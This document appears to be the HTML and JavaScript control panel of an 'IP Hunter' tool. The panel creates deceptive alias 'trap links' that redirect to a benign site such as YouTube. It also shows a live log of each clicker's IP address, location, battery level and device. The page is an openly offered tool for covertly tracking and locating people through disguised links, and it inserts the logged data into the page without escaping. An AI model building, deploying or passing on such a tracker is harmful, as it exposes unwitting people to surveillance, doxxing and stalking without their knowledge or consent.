<!DOCTYPE html>
<html>
<head>
    <title>Nawab ZADA - Ip Hunter</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .container { border: 2px solid #0f0; padding: 20px; border-radius: 10px; max-width: 800px; margin: auto; }
        input { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 90%; margin: 10px 0; }
        button { background: #0f0; color: #000; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #0f0; padding: 8px; font-size: 12px; }
        .res { color: cyan; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🦅 NAWAB ZADA IP HUNTER 🦾</h1>
        <hr color="#0f0">
        <h3>[+] GENERATE TRAP LINK</h3>
        <input type="text" id="target" placeholder="Destination URL (e.g. https://youtube.com)">
        <input type="text" id="alias" placeholder="Alias (e.g. free-net)">
        <button onclick="gen()">CREATE LINK</button>
        <div id="out" class="res"></div>

        <h3>[+] LIVE TARGET LOGS</h3>
        <table>
            <thead>
                <tr><th>TIME</th><th>IP ADDRESS</th><th>LOCATION</th><th>BATTERY</th><th>DEVICE</th></tr>
            </thead>
            <tbody id="logs"></tbody>
        </table>
    </div>

    <script>
        async function gen() {
            let target = document.getElementById('target').value;
            let alias = document.getElementById('alias').value;
            await fetch('/api/create', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ alias, target })
            });
            document.getElementById('out').innerText = "Link: " + window.location.origin + "/s/" + alias;
        }

        async function fetchLogs() {
            let res = await fetch('/api/getlogs');
            let data = await res.json();
            let html = "";
            data.forEach(l => {
                html += `<tr><td>${l.time}</td><td>${l.ip}</td><td>${l.location}</td><td>${l.battery}</td><td>${l.device.substring(0,30)}...</td></tr>`;
            });
            document.getElementById('logs').innerHTML = html;
        }
        setInterval(fetchLogs, 3000);
    </script>
</body>
</html>
